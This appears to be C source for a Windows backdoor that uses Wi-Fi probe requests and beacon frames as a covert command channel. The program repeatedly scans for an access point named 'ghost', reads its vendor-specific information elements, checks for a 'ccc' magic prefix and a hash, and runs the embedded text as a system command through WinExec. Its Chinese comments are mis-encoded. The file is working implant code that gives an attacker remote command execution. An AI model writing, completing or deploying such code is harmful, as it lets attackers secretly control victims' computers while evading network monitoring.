#ifndef UNICODE
#define UNICODE
#endif
#include "stdafx.h"
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>

#include <stdio.h>
#include <stdlib.h>

// Need to link with Wlanapi.lib and Ole32.lib
#pragma comment(lib, "wlanapi.lib")	//��ʾ����wlanapi.lib�����
#pragma comment(lib, "ole32.lib")

//payload�ṹ��
struct ie_data	//3���ֽ�
{
	unsigned char id;
	unsigned char len;
	unsigned char val[1];
};


//��װpayload
PWLAN_RAW_DATA get_payload(char *buf){

	//�ṹ���ʼ���ڴ�
	int len = strlen(buf) + 1;	//lenΪ���ݳ��ȣ�+1��������
	int response_len = sizeof(DWORD)  + sizeof(struct ie_data)  + len;//!!8+3+10  -2  19,��Ϊÿ���ṹ�嶼������һ����������ݣ�ռ1�ֽ�
	char *response = (char *)malloc(response_len);//���ٴ洢�ռ�
	memset(response, '\0', response_len);//ȫ�����Ϊ'\0'
	//��������ָ��
	PWLAN_RAW_DATA pwlan_data = (PWLAN_RAW_DATA)response;
	struct ie_data *piedata = (struct ie_data *)&pwlan_data->DataBlob[0];
	//д���ݰ�
	pwlan_data->dwDataSize = sizeof(struct ie_data) - 1 + len;
	piedata->id = (char)221;
	piedata->len = len;
	memcpy(&piedata->val[0], buf, len);
	return pwlan_data;
}

//��ȡ���
DWORD get_Handle(HANDLE *hClient, DWORD dwMaxClient,DWORD dwCurVersion){
	//dwMaxClient Ϊ�ͻ���֧�ֵ�WLANAPI����߰汾��dwCurVersion Ϊ��λỰ�н���ʹ�õİ汾

	DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, hClient);//��һ��������������ӣ���wlan�����
	//wprintf(L"WlanOpenHandle failed with error: %u\n", dwResult);
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"��ERROR��WlanOpenHandle failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//��ѯ�����б�
DWORD get_WlanList(HANDLE *hClient, PWLAN_INTERFACE_INFO_LIST *pIfList ) {
	if (*pIfList != NULL) {	//����б�
		WlanFreeMemory(*pIfList);
		*pIfList = NULL;
	}
	DWORD dwResult = WlanEnumInterfaces(*hClient, NULL, pIfList);//ö�������ڱ��ؼ�����ϵ�ǰ���õ�����LAN�ӿ�
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"��ERROR��WlanEnumInterfaces failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//��ѯ����״̬
PWLAN_INTERFACE_INFO get_Wlan(PWLAN_INTERFACE_INFO_LIST *pIfList) {
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	WCHAR GuidString[40] = { 0 };
	printf("[INFO]Interface Information��\n");
	wprintf(L"  Numbers of Interface: %lu\n", (*pIfList)->dwNumberOfItems);//��ӡwlan��Ŀ��
	wprintf(L"  Current Index: %lu\n", (*pIfList)->dwIndex);//��ӡ��ǰ����
	for (int i = 0; i < (int)(*pIfList)->dwNumberOfItems; i++) {
		pIfInfo = (WLAN_INTERFACE_INFO *)&(*pIfList)->InterfaceInfo[i];
		wprintf(L"  Interface Index[%d]:\t %lu\n", i, i);
		int iRet = StringFromGUID2((pIfInfo)->InterfaceGuid, (LPOLESTR)&GuidString, 39);//��ӡGUID
		if (iRet == 0)
			wprintf(L"StringFromGUID2 failed\n");
		else {
			wprintf(L"  InterfaceGUID[%d]: %ws\n", i, GuidString);
		}
		wprintf(L"  Interface Description[%d]: %ws", i,
			(pIfInfo)->strInterfaceDescription);//��ӡ����
		wprintf(L"\n");
		wprintf(L"  Interface State[%d]:\t ", i);//��ӡ״̬
		switch ((pIfInfo)->isState) {
		case wlan_interface_state_not_ready:
			wprintf(L"Not ready\n");
			break;
		case wlan_interface_state_connected:
			wprintf(L"Connected\n");
			break;
		case wlan_interface_state_ad_hoc_network_formed:
			wprintf(L"First node in a ad hoc network\n");
			break;
		case wlan_interface_state_disconnecting:
			wprintf(L"Disconnecting\n");
			break;
		case wlan_interface_state_disconnected:
			wprintf(L"Not connected\n");
			break;
		case wlan_interface_state_associating:
			wprintf(L"Attempting to associate with a network\n");
			break;
		case wlan_interface_state_discovering:
			wprintf(L"Auto configuration is discovering settings for the network\n");
			break;
		case wlan_interface_state_authenticating:
			wprintf(L"In process of authenticating\n");
			break;
		default:
			wprintf(L"Unknown state %ld\n", (pIfInfo)->isState);
			break;
		}
	}
	return pIfInfo;//Ĭ�ϲ��÷������һ��������Ϣ
}
//����̽��
DWORD sendRequest(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, char *ssid, PWLAN_RAW_DATA pwlan_data){
	//ssid Ϊ��Ҫ������SSID���ƣ�pwlan_data Ϊ��װ��payload

	//PDOT11_SSID pdo = new DOT11_SSID;  //�洢ssid�Ľṹ��
	//pdo->uSSIDLength = strlen(ssid); //��ȡssid�ĳ��ȣ�����ṹ����.. ULONG����
	//UCHAR *ucp = (UCHAR *)malloc(pdo->uSSIDLength + 1);	//����һ���ռ䣬����λSSID�ĳ���
	//memset(ucp, '\0', pdo->uSSIDLength + 1);	//ucp�����uSSIDLength���ȵĿռ���'\0'���
	//strcpy((char*)ucp, ssid);//��ssid��ֵ��������

	DWORD dwResult = WlanScan(*hClient, &(*pIfInfo)->InterfaceGuid, NULL, pwlan_data, NULL);//ָ���ӿ��Ͻ�������ɨ��
	if (dwResult != ERROR_SUCCESS) {
		printf("��ERROR��Sending probe Request with error: %u\n", dwResult);
	}
	else {
		printf("[INFO]Sending probe Request...\n");
	}
	//free(pdo);  //�ͷſռ�
	return dwResult;
}


void getcmd(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo,WLAN_AVAILABLE_NETWORK *pBssEntry, char *ssid,char *hash){
	PWLAN_BSS_LIST ppWlanBssList;
	char* magic_code = "ccc";	//����������ֶ�
	DWORD dwResult2 = WlanGetNetworkBssList(*hClient, &(*pIfInfo)->InterfaceGuid,//����һ������������LAN�ӿ��ϵ��������������Ļ������񼯣�BSS������Ŀ���б�
		&pBssEntry->dot11Ssid,
		pBssEntry->dot11BssType,
		pBssEntry->bSecurityEnabled,
		NULL,
		&ppWlanBssList);
	//printf("%d", ppWlanBssList->dwNumberOfItems);
	for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
	{
		WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];

		printf("USSID�� %s\n", bss_entry->dot11Ssid.ucSSID);
		printf("�ź�ǿ�ȣ�%d\n", bss_entry->lRssi);

		char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);//��ϢԪ�ص�λ��
		int total_size = bss_entry->ulIeSize;
		//printf("���ȣ�%d",total_size);
		while(TRUE){		//�������е�payload
			ie_data * ie = (struct ie_data *)pp;
			printf("total_size:%d\n", total_size);
			printf("ie  @ %x\n", &ie);
			printf("id  @ %x: %d\n", &ie->id, ie->id);
			printf("len @ %x: %d\n", &ie->len, ie->len);
			printf("val @ %x: %s\n", &ie->val, ie->val);

			if ((int)ie->id == 221) {
				char *magic = (char *)&ie->val[0];//��λ�� ������Ϣλ��
				printf("%s \n",magic);//������Ϣ

				if (strncmp(magic, magic_code, strlen(magic_code)) == 0) {//У�������ֶ�
				
					char command[240] = { 0 };
					char hash_tmp[9] = {'\0'};
					strncpy(hash_tmp, magic + 3, 8);//��ȡhash
					if (strncmp(hash, hash_tmp, 8) == 0) {
						printf("��WARNING��REAPTINGHASH : %s\n", hash);
						break;
					}
					else {
						strncpy(hash, hash_tmp, 8);
					}
					strncpy_s(command, magic + 11, ie->len - 11);
					printf("HASH : %s\n",hash);
					printf("Get Commands��%s\n", command);//ִ������
					WinExec(command, SW_NORMAL);
					//system("pause");
					//exit(1); //�˳�
					break;
				}
			}
			pp += sizeof(struct ie_data) - 1 + (int)ie->len;
			total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;

			if (!total_size){
				break;  // over  
			}
		}
	}
}

//��ȡ����AP
void getssid(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, char *ssid,char *hash) {
	PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL; //����������Ϣ�б�

	DWORD dwResult = WlanGetAvailableNetworkList(*hClient, &(*pIfInfo)->InterfaceGuid, 0, NULL, &pBssList);//��ȡ����LAN�ӿ��ϵĿ��������б�
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"��ERROR��WlanGetAvailableNetworkList failed with error: %u\n", dwResult);
	}
	else {
		wprintf(L"[INFO]Numbers of AP: %lu\n", (pBssList)->dwNumberOfItems);//��ӡAP�ĸ���
		for (int j = 0; j < (pBssList)->dwNumberOfItems; j++) {	//����ÿ��AP�����ƣ������бȽ�
			WLAN_AVAILABLE_NETWORK* pBssEntry = (WLAN_AVAILABLE_NETWORK *)& (pBssList)->Network[j];
			printf("(%d):%s   ", j, (char *)pBssEntry->dot11Ssid.ucSSID);
			if (_stricmp((char *)pBssEntry->dot11Ssid.ucSSID, ssid) == 0) {
				printf("\n[INFO]Find Server!\n\n");
				getcmd(hClient, pIfInfo, pBssEntry, ssid , hash);
			}
		}
	}
	printf("\n[INFO]Searching Server...\n\n");
	if (pBssList != NULL) {
		WlanFreeMemory(pBssList);
		pBssList = NULL;
	}
}


struct STATUS_WLAN {
	DWORD STATUS_handle;
	DWORD STATUS_wlanList;
	DWORD STATUS_sendRequest;
};
int wmain()
{
	HANDLE hClient = NULL;//ָ��wlan�ͻ����ڻỰ��ʹ�õľ������������ᴩ�����Ự����������ʹ��
	PWLAN_INTERFACE_INFO_LIST pIfList = NULL; //ָ��洢 ���ؼ�������õ�����LAN�ӿ� ��ָ��
	PWLAN_INTERFACE_INFO pIfInfo = NULL;//������Ϣ

	struct STATUS_WLAN status_wlan = {-1,-1,-1};

	char *cmd = "command ok";
	char *ssid = "ghost";
	char hash[9] = { '\0' };
	PWLAN_RAW_DATA pwlan_data = get_payload(cmd);
	
	while (true) {
		
		if (status_wlan.STATUS_handle != 0) {
			status_wlan.STATUS_handle = get_Handle(&hClient, 2, 0);
		}
		if (status_wlan.STATUS_wlanList != 0) {
			status_wlan.STATUS_wlanList = get_WlanList(&hClient, &pIfList);
			pIfInfo = get_Wlan(&pIfList);
		}

		status_wlan.STATUS_sendRequest = sendRequest(&hClient, &pIfInfo, NULL, pwlan_data);
		if (status_wlan.STATUS_sendRequest == 0) {

		}
		getssid(&hClient , &pIfInfo , ssid, hash);
		Sleep(3000);
		
	}


	return 0;
}
